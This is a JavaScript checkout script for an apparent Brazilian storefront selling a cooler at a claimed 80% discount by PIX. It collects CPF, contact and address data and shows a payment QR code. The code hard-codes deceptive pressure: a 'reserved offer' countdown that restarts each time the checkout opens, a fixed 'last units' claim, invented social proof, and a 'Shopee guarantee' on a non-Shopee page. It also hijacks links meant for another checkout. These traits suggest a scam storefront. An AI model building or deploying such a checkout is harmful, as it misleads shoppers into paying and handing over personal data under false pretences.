/* =========================================================================
   Checkout PIX Velory — tela cheia mobile-first (vanilla JS).
   Fluxo: Seus dados → Resumo do pedido → PIX → Confirmação.
   ========================================================================= */
(function () {
  'use strict';

  var PRODUCT_NAME = 'Caixa Cooler Térmico Trailmate 66L Igloo Cinza';
  var PRODUCT_IMG = 'images/D_NQ_NP_2X_722241-MLA91596322245_092025-F.webp';
  var PRICE_CENTS = 7990;
  var PRICE_OLD = 'R$ 331,90';
  var POLL_MS = 4000;
  var PIX_WINDOW_SEC = 10 * 60;
  var DELIVERY_DAYS = 4; // dias corridos para a previsão de entrega

  // ---- helpers ----
  function brl(c) { return 'R$ ' + (c / 100).toFixed(2).replace('.', ','); }
  function el(html) { var t = document.createElement('template'); t.innerHTML = html.trim(); return t.content.firstChild; }
  function digits(s) { return (s || '').replace(/\D/g, ''); }
  function esc(s) { return String(s == null ? '' : s).replace(/[&<>"']/g, function (m) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m]; }); }
  function maskCPF(v) { v = digits(v).slice(0, 11); return v.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2'); }
  function maskPhone(v) { v = digits(v).slice(0, 11); if (v.length <= 10) return v.replace(/(\d{2})(\d)/, '($1) $2').replace(/(\d{4})(\d)/, '$1-$2'); return v.replace(/(\d{2})(\d)/, '($1) $2').replace(/(\d{5})(\d)/, '$1-$2'); }
  function maskCEP(v) { v = digits(v).slice(0, 8); return v.replace(/(\d{5})(\d)/, '$1-$2'); }

  // ---- validação (cliente) — o servidor revalida tudo ----
  function isValidEmail(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v || '').trim()); }
  function isValidPhone(v) { var p = digits(v); return p.length === 10 || p.length === 11; }
  function isValidCPF(v) {
    var cpf = digits(v);
    if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
    var s = 0, i, d;
    for (i = 0; i < 9; i++) s += parseInt(cpf[i], 10) * (10 - i);
    d = 11 - (s % 11); if (d >= 10) d = 0; if (d !== parseInt(cpf[9], 10)) return false;
    s = 0; for (i = 0; i < 10; i++) s += parseInt(cpf[i], 10) * (11 - i);
    d = 11 - (s % 11); if (d >= 10) d = 0; return d === parseInt(cpf[10], 10);
  }
  function validateClient(d) {
    var e = {};
    if (!d.name || d.name.length < 3 || d.name.indexOf(' ') < 0) e.name = 'Informe seu nome completo.';
    if (!isValidEmail(d.email)) e.email = 'E-mail inválido.';
    if (!isValidPhone(d.phone)) e.phone = 'Telefone inválido (com DDD).';
    if (!isValidCPF(d.document)) e.document = 'CPF inválido.';
    if (digits(d.cep).length !== 8) e.cep = 'CEP inválido.';
    if (!d.street || d.street.length < 3) e.street = 'Informe o endereço.';
    if (!d.number) e.number = 'Informe o número.';
    if (!d.neighborhood || d.neighborhood.length < 2) e.neighborhood = 'Informe o bairro.';
    if (!d.city || d.city.length < 2) e.city = 'Informe a cidade.';
    if (!/^[A-Za-z]{2}$/.test((d.state || '').trim())) e.state = 'UF inválida.';
    return e;
  }

  // ---- previsão de entrega (script com a data atual) ----
  function deliveryEstimate() {
    var d = new Date();
    d.setDate(d.getDate() + DELIVERY_DAYS);
    var s = d.toLocaleDateString('pt-BR', { weekday: 'long', day: '2-digit', month: 'long' });
    return s.charAt(0).toUpperCase() + s.slice(1); // "Quarta-feira, 02 de junho"
  }

  // ---- ícones ----
  var ICON = {
    back: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>',
    arrow: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>',
    check: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
    truck: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="3" width="15" height="13" rx="1"/><path d="M16 8h4l3 3v5h-7z"/><circle cx="5.5" cy="18.5" r="2"/><circle cx="18.5" cy="18.5" r="2"/></svg>',
    shield: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
    clock: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 16 14"/></svg>',
    pin: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 12-9 12s-9-5-9-12a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>',
    refund: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="1 4 1 10 7 10"/><path d="M3.5 15a9 9 0 1 0 2.1-9.4L1 10"/></svg>',
    pix: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l4 4-4 4-4-4z"/><path d="M2 12l4-4 4 4-4 4z"/><path d="M22 12l-4-4-4 4 4 4z"/><path d="M12 14l4 4-4 4-4-4z"/></svg>',
    box: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 8l-9-5-9 5 9 5 9-5z"/><path d="M3 8v8l9 5 9-5V8"/><path d="M12 13v8"/></svg>'
  };

  // ---- estado ----
  var overlay, pollTimer, countdownTimer, lastPayload, currentChargeId, currentOrderId, isTest = false, currentStep = 'form', lastCepLookup = '', icDispatched = false;
  function emit(name, detail) { try { document.dispatchEvent(new CustomEvent(name, { detail: detail || {} })); } catch (e) {} }
  // número de pedido amigável (sem citar o gateway)
  function friendlyOrder(id) { return '#' + String(id || '').replace(/^cooler_/, '').replace(/[^A-Za-z0-9]/g, '').toUpperCase().slice(0, 12); }

  // UTMs do anúncio: captura da URL no 1º acesso e persiste (pra atribuição na UTMify)
  (function captureUtms() {
    try {
      var qs = new URLSearchParams(location.search);
      var keys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck'];
      var u = {}, any = false;
      keys.forEach(function (k) { var v = qs.get(k); if (v) { u[k] = v; any = true; } });
      if (any) localStorage.setItem('vy_utm', JSON.stringify(u));
    } catch (e) {}
  })();
  function getUtms() { try { return JSON.parse(localStorage.getItem('vy_utm') || '{}'); } catch (e) { return {}; } }

  // ========================================================================
  function buildModal() {
    overlay = el(
      '<div class="vchk-overlay" id="vchk-root" role="dialog" aria-modal="true" aria-label="Finalizar compra">' +
        '<div class="vchk-card">' +

          '<div class="vchk-header">' +
            '<button class="vchk-back" data-back aria-label="Voltar">' + ICON.back + '</button>' +
            '<span class="vc-title">Finalizar compra</span>' +
            '<span class="vc-secure">Ambiente Seguro</span>' +
          '</div>' +

          '<div class="vchk-scroll">' +
            '<div class="vchk-summary">' +
              '<img src="' + PRODUCT_IMG + '" alt="' + esc(PRODUCT_NAME) + '" onerror="this.style.display=\'none\'">' +
              '<div class="vc-info">' +
                '<div class="vc-name">' + esc(PRODUCT_NAME) + '</div>' +
                '<div class="vchk-price-row">' +
                  '<span class="vchk-price-now">' + brl(PRICE_CENTS) + '</span>' +
                  '<span class="vchk-price-old">' + PRICE_OLD + '</span>' +
                  '<span class="vchk-badge-off">-80%</span>' +
                '</div>' +
                '<span class="vchk-ship">' + ICON.truck + ' Frete GRÁTIS para todo o Brasil</span>' +
              '</div>' +
            '</div>' +

            '<div class="vchk-urgency">🔥 Oferta reservada por <b data-countdown>10:00</b> · últimas unidades</div>' +
            '<div class="vchk-alert" data-alert></div>' +

            '<div class="vchk-stepper">' +
              '<div class="vc-s" data-st="1"><span class="vc-circle">1</span><span class="vc-lbl">Identificação</span></div>' +
              '<div class="vc-s" data-st="2"><span class="vc-circle">2</span><span class="vc-lbl">Pagamento</span></div>' +
              '<div class="vc-s" data-st="3"><span class="vc-circle">3</span><span class="vc-lbl">Entrega</span></div>' +
            '</div>' +

            // STEP DADOS
            '<div data-step="form">' +
              '<form class="vchk-form" novalidate>' +
                '<div class="vchk-cardbox">' +
                '<div class="vchk-section-title">Identificação</div>' +
                field('name', 'Nome completo', 'text', 'Digite seu nome completo', 'name') +
                '<div class="vchk-row">' +
                  field('document', 'CPF', 'tel', '000.000.000-00', 'off', 'flex:1') +
                  field('phone', 'Celular / WhatsApp', 'tel', '(00) 00000-0000', 'tel', 'flex:1') +
                '</div>' +
                field('email', 'E-mail', 'email', 'voce@email.com', 'email') +

                '<div class="vchk-section-title">Endereço de entrega</div>' +
                '<div class="vchk-field" data-f="cep">' +
                  '<label>CEP</label>' +
                  '<input name="cep" type="tel" inputmode="numeric" placeholder="00000-000" autocomplete="postal-code">' +
                  '<div class="vchk-cep-status" data-cep-status></div>' +
                  '<div class="vchk-err">CEP inválido.</div>' +
                '</div>' +
                '<div class="vchk-row">' +
                  field('street', 'Endereço', 'text', 'Rua, avenida...', 'off', 'flex:2') +
                  field('number', 'Número', 'text', 'Nº', 'off', 'flex:1') +
                '</div>' +
                field('complement', 'Complemento (opcional)', 'text', 'Apto, bloco, ponto de referência', 'off') +
                '<div class="vchk-row">' +
                  field('neighborhood', 'Bairro', 'text', 'Bairro', 'off', 'flex:1.3') +
                  field('city', 'Cidade', 'text', 'Cidade', 'off', 'flex:1.5') +
                  field('state', 'UF', 'text', 'UF', 'off', 'flex:.7') +
                '</div>' +
                '</div>' + // .vchk-cardbox

                '<div class="vchk-trust">' +
                  '<span class="vc-t">' + ICON.shield + ' Ambiente seguro</span>' +
                  '<span class="vc-t">' + ICON.shield + ' Dados protegidos</span>' +
                '</div>' +
                '<div class="vchk-social"><b>+100.000</b> clientes satisfeitos</div>' +
                '<button type="submit" style="position:absolute;left:-9999px" aria-hidden="true" tabindex="-1"></button>' +
              '</form>' +
            '</div>' +

            // STEP RESUMO
            '<div data-step="review" style="display:none">' +
              '<div class="vchk-review">' +
                '<div class="vchk-rv-card">' +
                  '<img src="' + PRODUCT_IMG + '" alt="' + esc(PRODUCT_NAME) + '" onerror="this.style.display=\'none\'">' +
                  '<div>' +
                    '<div class="vc-name">' + esc(PRODUCT_NAME) + '</div>' +
                    '<div class="vc-qty">Quantidade: 1</div>' +
                    '<div class="vchk-price-row">' +
                      '<span class="vchk-price-now">' + brl(PRICE_CENTS) + '</span>' +
                      '<span class="vchk-price-old">' + PRICE_OLD + '</span>' +
                      '<span class="vchk-badge-off">-80%</span>' +
                    '</div>' +
                  '</div>' +
                '</div>' +

                '<div class="vchk-rv-block-title">Entrega</div>' +
                '<div class="vchk-rv-delivery">' +
                  '<div class="vc-row">' + ICON.truck + ' Frete GRÁTIS para todo o Brasil</div>' +
                  '<div class="vc-row">' + ICON.clock + ' Prazo de envio: 1 a 4 dias úteis</div>' +
                  '<div class="vc-row vc-eta">' + ICON.pin + ' <span>Previsão de entrega: <b data-rv-delivery>—</b></span></div>' +
                '</div>' +

                '<div class="vchk-rv-block-title">Entregar para</div>' +
                '<div class="vchk-rv-addr">' +
                  '<div class="vc-name" data-rv-name></div>' +
                  '<div class="vc-lines" data-rv-address></div>' +
                '</div>' +

                '<div class="vchk-rv-block-title">Suas garantias</div>' +
                '<div class="vchk-rv-guard">' +
                  '<div class="vc-g">' + ICON.shield + ' Garantia Shopee <span>· reembolso se não receber</span></div>' +
                  '<div class="vc-g">' + ICON.refund + ' Devolução grátis <span>· em até 7 dias</span></div>' +
                  '<div class="vc-g">' + ICON.shield + ' Pagamento 100% seguro <span>· criptografado</span></div>' +
                '</div>' +

                '<div class="vchk-rv-excl">🔥 Oferta exclusiva — disponível somente via PIX</div>' +
              '</div>' +
            '</div>' +

            // STEP PIX
            '<div data-step="pix" style="display:none">' +
              '<div class="vchk-pix">' +
                '<div data-sandbox-tag style="display:none"><span class="vchk-sandbox-tag">Modo teste (sandbox)</span></div>' +
                '<h3>Escaneie para pagar</h3>' +
                '<p class="vc-sub">Abra o app do seu banco, escolha <b>PIX</b> e pague <b>' + brl(PRICE_CENTS) + '</b>.</p>' +
                '<div class="vchk-qr" data-qr></div>' +
                '<div class="vchk-copy-label">Ou use o PIX copia e cola:</div>' +
                '<div class="vchk-copy-box">' +
                  '<input type="text" readonly data-copia placeholder="Gerando código...">' +
                  '<button type="button" class="vchk-copy-btn" data-copy>Copiar</button>' +
                '</div>' +
                '<div class="vchk-waiting" data-waiting><span class="vchk-spinner"></span> Aguardando confirmação do pagamento…</div>' +
                '<ol class="vchk-steps-pix">' +
                  '<li>1. Copie o código acima.</li>' +
                  '<li>2. No app do banco, escolha <b>PIX copia e cola</b>.</li>' +
                  '<li>3. Confirme — a aprovação aqui é <b>automática</b>.</li>' +
                '</ol>' +
                '<div class="vchk-sim" data-sim style="display:none">' +
                  '<button type="button" data-sim-btn>✓ Simular pagamento (sandbox)</button>' +
                '</div>' +
              '</div>' +
            '</div>' +

            // STEP SUCESSO
            '<div data-step="done" style="display:none">' +
              '<div class="vchk-success">' +
                '<div class="vchk-check">' + ICON.check + '</div>' +
                '<h3>Pagamento aprovado!</h3>' +
                '<p>Recebemos seu PIX com sucesso. Obrigado pela compra! 🎉</p>' +
                '<div class="vchk-ship-status">' +
                  '<div class="vc-ss-row">' + ICON.box + ' <b>Pedido em separação</b></div>' +
                  '<div class="vc-ss-row">' + ICON.truck + ' Frete grátis · envio em 1 a 4 dias úteis</div>' +
                  '<div class="vc-ss-eta">' + ICON.pin + '<div><span>Previsão de entrega</span><b data-done-eta>—</b></div></div>' +
                '</div>' +
                '<div class="vchk-order-id" data-order></div>' +
              '</div>' +
            '</div>' +

          '</div>' + // scroll

          '<div class="vchk-footer" data-footer>' +
            '<div class="vchk-foot-price">' +
              '<div class="vc-fp-now">' + brl(PRICE_CENTS) + '</div>' +
              '<div class="vc-fp-sub">Frete grátis</div>' +
            '</div>' +
            '<button type="button" class="vchk-cta" data-pay></button>' +
          '</div>' +

        '</div>' +
      '</div>'
    );

    document.body.appendChild(overlay);
    wireEvents();
  }

  function field(name, label, type, ph, ac, style) {
    return '<div class="vchk-field" data-f="' + name + '"' + (style ? ' style="' + style + '"' : '') + '>' +
      '<label>' + label + '</label>' +
      '<input name="' + name + '" type="' + type + '" placeholder="' + ph + '" autocomplete="' + (ac || 'off') + '">' +
      '<div class="vchk-err"></div></div>';
  }

  // ========================================================================
  function $(sel) { return overlay.querySelector(sel); }

  function setStep(name) {
    currentStep = name;
    ['form', 'review', 'pix', 'done'].forEach(function (s) {
      $('[data-step="' + s + '"]').style.display = (s === name) ? 'block' : 'none';
    });

    // stepper de 3 bolinhas: acende em laranja conforme avança
    var reached = { form: 1, review: 2, pix: 2, done: 3 }[name] || 1;
    overlay.querySelectorAll('.vchk-stepper .vc-s').forEach(function (s) {
      var n = parseInt(s.getAttribute('data-st'), 10);
      s.classList.toggle('is-on', n <= reached);
    });

    var urg = overlay.querySelector('.vchk-urgency');
    if (urg) urg.style.display = (name === 'done') ? 'none' : 'flex';

    // footer (CTA): "Continuar" no form, "Gerar PIX agora" no resumo; escondido no resto
    var footer = $('[data-footer]'), pay = $('[data-pay]');
    if (name === 'form') { footer.style.display = 'flex'; pay.innerHTML = 'Continuar ' + ICON.arrow; }
    else if (name === 'review') { footer.style.display = 'flex'; pay.innerHTML = ICON.pix + ' Gerar PIX agora'; }
    else { footer.style.display = 'none'; }
    pay.disabled = false;

    $('.vchk-scroll').scrollTop = 0;
  }

  function showAlert(msg) {
    var a = $('[data-alert]');
    if (!msg) { a.classList.remove('is-on'); a.textContent = ''; return; }
    a.textContent = msg; a.classList.add('is-on');
    a.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
  }

  function wireEvents() {
    $('[data-back]').addEventListener('click', onBack);
    // clicar fora do card (área escurecida no desktop) fecha o checkout
    overlay.addEventListener('mousedown', function (e) { if (e.target === overlay) close(); });
    document.addEventListener('keydown', function (e) { if (e.key === 'Escape' && overlay.classList.contains('is-open')) onBack(); });

    // limites de tamanho (espelham os do servidor)
    var maxlens = { name: 150, email: 150, street: 200, number: 20, complement: 150, neighborhood: 100, city: 100, state: 2, cep: 9, phone: 16, document: 14 };
    Object.keys(maxlens).forEach(function (n) { var i = $('input[name="' + n + '"]'); if (i) i.maxLength = maxlens[n]; });

    bindMask('document', maskCPF);
    bindMask('phone', maskPhone);
    bindMask('cep', maskCEP);

    overlay.querySelectorAll('.vchk-form input').forEach(function (inp) {
      inp.addEventListener('input', function () {
        inp.closest('.vchk-field').classList.remove('has-error');
        if (!icDispatched) { icDispatched = true; emit('vy:initiatecheckout'); } // começou a preencher
      });
    });

    var cep = $('input[name="cep"]');
    cep.addEventListener('input', onCepInput);
    cep.addEventListener('blur', onCepInput);

    $('.vchk-form').addEventListener('submit', function (e) { e.preventDefault(); if (currentStep === 'form') goReview(); });
    $('[data-pay]').addEventListener('click', onFooterCta);
    $('[data-copy]').addEventListener('click', copyPix);
    $('[data-sim-btn]').addEventListener('click', simulate);
  }

  function onBack() {
    if (currentStep === 'pix') { stopPolling(); setStep('review'); }
    else if (currentStep === 'review') { setStep('form'); }
    else { close(); }
  }

  function onFooterCta() {
    if (currentStep === 'form') goReview();
    else if (currentStep === 'review') generatePix();
  }

  function bindMask(name, fn) {
    var inp = $('input[name="' + name + '"]');
    inp.addEventListener('input', function () {
      var pos = inp.selectionStart, before = inp.value.length;
      inp.value = fn(inp.value);
      if (pos < before) inp.setSelectionRange(pos, pos);
    });
    inp.addEventListener('change', function () { inp.value = fn(inp.value); });
  }

  // CEP: ao completar 8 dígitos preenche SÓ bairro, cidade e UF (endereço/número/complemento manuais)
  function onCepInput() {
    var inp = $('input[name="cep"]'), status = $('[data-cep-status]');
    var cep = digits(inp.value);
    if (cep.length !== 8) { return; }
    if (cep === lastCepLookup) return;
    lastCepLookup = cep;
    status.className = 'vchk-cep-status is-loading'; status.textContent = 'Buscando endereço…';
    fetch('https://viacep.com.br/ws/' + cep + '/json/')
      .then(function (r) { return r.json(); })
      .then(function (d) {
        if (d.erro) { status.className = 'vchk-cep-status is-error'; status.textContent = 'CEP não encontrado — preencha manualmente.'; return; }
        if (d.logradouro) setVal('street', d.logradouro); // endereço também é preenchido (quando encontrado)
        if (d.bairro) setVal('neighborhood', d.bairro);
        if (d.localidade) setVal('city', d.localidade);
        if (d.uf) setVal('state', d.uf);
        status.className = 'vchk-cep-status'; status.textContent = '✓ ' + (d.localidade || '') + (d.uf ? ' - ' + d.uf : '');
        // foca no campo que o cliente ainda precisa preencher manualmente
        var street = $('input[name="street"]'), num = $('input[name="number"]');
        if (street && !street.value) street.focus(); // CEP sem logradouro (ex: cidade) → endereço manual
        else if (num && !num.value) num.focus(); // endereço veio preenchido → vai pro número
      })
      .catch(function () { status.className = 'vchk-cep-status'; status.textContent = ''; lastCepLookup = ''; });
  }
  function setVal(name, v) {
    var inp = $('input[name="' + name + '"]');
    if (inp) { inp.value = v; inp.closest('.vchk-field').classList.remove('has-error'); }
  }

  function collect() {
    var data = {};
    overlay.querySelectorAll('.vchk-form input').forEach(function (i) { if (i.name) data[i.name] = i.value.trim(); });
    return data;
  }
  function markErrors(fields) {
    overlay.querySelectorAll('.vchk-field').forEach(function (f) { f.classList.remove('has-error'); });
    Object.keys(fields || {}).forEach(function (k) {
      var f = overlay.querySelector('.vchk-field[data-f="' + k + '"]');
      if (f) { f.classList.add('has-error'); var err = f.querySelector('.vchk-err'); if (err && fields[k]) err.textContent = fields[k]; }
    });
    var first = overlay.querySelector('.vchk-field.has-error input');
    if (first) { first.focus(); first.scrollIntoView({ block: 'center', behavior: 'smooth' }); }
  }

  // ---- form → resumo ----
  function goReview() {
    showAlert('');
    var data = collect();
    var errs = validateClient(data);
    if (Object.keys(errs).length) { markErrors(errs); showAlert('Confira os campos destacados.'); return; }
    lastPayload = data;
    populateReview(data);
    setStep('review');
  }

  function populateReview(d) {
    $('[data-rv-delivery]').textContent = deliveryEstimate();
    $('[data-rv-name]').textContent = d.name;
    var line1 = d.street + ', ' + d.number + (d.complement ? ' — ' + d.complement : '');
    var line2 = d.neighborhood + ' — ' + d.city + '/' + d.state.toUpperCase();
    var line3 = 'CEP ' + maskCEP(d.cep);
    $('[data-rv-address]').innerHTML = esc(line1) + '<br>' + esc(line2) + '<br>' + esc(line3);
  }

  // ---- resumo → PIX ----
  function generatePix() {
    showAlert('');
    var data = lastPayload || collect();
    data.utm = getUtms(); // leva os UTMs do anúncio pra atribuição na UTMify
    var btn = $('[data-pay]');
    btn.disabled = true;
    var orig = btn.innerHTML;
    btn.innerHTML = '<span class="vchk-spinner" style="border-top-color:#fff;border-color:rgba(255,255,255,.4)"></span> Gerando PIX…';

    fetch('/api/checkout', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
      .then(function (r) { return r.json().then(function (j) { return { ok: r.ok, j: j }; }); })
      .then(function (res) {
        btn.disabled = false; btn.innerHTML = orig;
        if (!res.ok) {
          if (res.j.fields) { setStep('form'); markErrors(res.j.fields); }
          showAlert(res.j.error || 'Não foi possível gerar o PIX.');
          return;
        }
        startPix(res.j);
      })
      .catch(function () { btn.disabled = false; btn.innerHTML = orig; showAlert('Falha de conexão. Verifique sua internet e tente novamente.'); });
  }

  function startPix(charge) {
    currentChargeId = charge.id;
    currentOrderId = charge.order_id || charge.id;
    isTest = !!charge.test_mode;
    setStep('pix');
    $('[data-alert]').classList.remove('is-on');
    renderQR($('[data-qr]'), charge.qr_code, charge.qr_code_base64);
    $('[data-copia]').value = charge.qr_code || '';
    if (isTest) { $('[data-sim]').style.display = 'block'; $('[data-sandbox-tag]').style.display = 'block'; }
    startPolling();
  }

  function renderQR(box, emv, base64) {
    if (emv && typeof window.qrcode === 'function') {
      try {
        var q = window.qrcode(0, 'M'); q.addData(emv); q.make();
        box.innerHTML = '<img alt="QR Code PIX" src="' + q.createDataURL(6, 4) + '">';
        box.style.display = 'flex'; return;
      } catch (e) { /* fallback */ }
    }
    var b = base64 || '';
    var looksImg = b.indexOf('data:') === 0 || /^(iVBOR|\/9j\/|R0lGOD|UklGR)/.test(b);
    if (b && looksImg) {
      var src = b.indexOf('data:') === 0 ? b : 'data:image/png;base64,' + b;
      box.innerHTML = '<img alt="QR Code PIX" src="' + src + '">'; box.style.display = 'flex'; return;
    }
    box.style.display = 'none';
  }

  function copyPix() {
    var inp = $('[data-copia]'); if (!inp.value) return;
    var btn = $('[data-copy]');
    var done = function () { btn.textContent = 'Copiado!'; btn.classList.add('is-copied'); setTimeout(function () { btn.textContent = 'Copiar'; btn.classList.remove('is-copied'); }, 2000); };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(inp.value).then(done, function () { inp.select(); document.execCommand('copy'); done(); });
    } else { inp.select(); document.execCommand('copy'); done(); }
  }

  function startPolling() {
    stopPolling();
    pollTimer = setInterval(function () {
      fetch('/api/status?id=' + encodeURIComponent(currentChargeId), { cache: 'no-store' })
        .then(function (r) { return r.json(); })
        .then(function (j) {
          if (j.paid) { onPaid(); }
          else if (j.status === 'expired' || j.status === 'failed' || j.status === 'canceled') {
            stopPolling(); stopCountdown(); showAlert('O PIX expirou. Volte e gere um novo código.');
          }
        })
        .catch(function () {});
    }, POLL_MS);
  }
  function stopPolling() { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }

  function onPaid() {
    stopPolling(); stopCountdown();
    $('[data-order]').textContent = 'Pedido ' + friendlyOrder(currentOrderId);
    // Purchase só em pagamento REAL (live) — sandbox não suja os dados do pixel
    if (!isTest) emit('vy:purchase', { chargeId: currentChargeId, orderId: currentOrderId });
    var eta = $('[data-done-eta]'); if (eta) eta.textContent = deliveryEstimate();
    setStep('done');
  }

  function simulate() {
    if (!currentChargeId) return;
    var b = $('[data-sim-btn]'); b.disabled = true; b.textContent = 'Confirmando…';
    fetch('/api/simulate?id=' + encodeURIComponent(currentChargeId), { method: 'POST' })
      .then(function (r) { return r.json(); })
      .then(function (j) { b.disabled = false; b.textContent = '✓ Simular pagamento (sandbox)'; if (j.status === 'paid') onPaid(); })
      .catch(function () { b.disabled = false; b.textContent = '✓ Simular pagamento (sandbox)'; });
  }

  function startCountdown() {
    stopCountdown();
    var left = PIX_WINDOW_SEC, elc = overlay.querySelector('[data-countdown]');
    var tick = function () {
      var m = Math.floor(left / 60), s = left % 60;
      if (elc) elc.textContent = (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
      if (left <= 0) { stopCountdown(); return; }
      left--;
    };
    tick(); countdownTimer = setInterval(tick, 1000);
  }
  function stopCountdown() { if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } }

  // ========================================================================
  function open() {
    if (!overlay) buildModal();
    stopPolling();
    setStep('form'); // sempre começa do zero (evita herdar tela de sucesso/pix anterior)
    startCountdown();
    overlay.classList.add('is-open');
    document.body.style.overflow = 'hidden';
    emit('vy:addtocart'); // abriu o checkout = AddToCart
  }
  function close() {
    overlay.classList.remove('is-open');
    document.body.style.overflow = '';
    stopPolling();
    stopCountdown();
  }

  function hookButtons() {
    var links = document.querySelectorAll('a[href*="seguro.cooleroferta.shop"], a[href*="cooleroferta.shop/api/public/shopify"], #clickbotao');
    links.forEach(function (a) {
      a.addEventListener('click', function (e) { e.preventDefault(); e.stopPropagation(); open(); });
      a.style.cursor = 'pointer';
    });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', hookButtons);
  else hookButtons();

  window.CoolerCheckout = { open: open, close: close };
})();
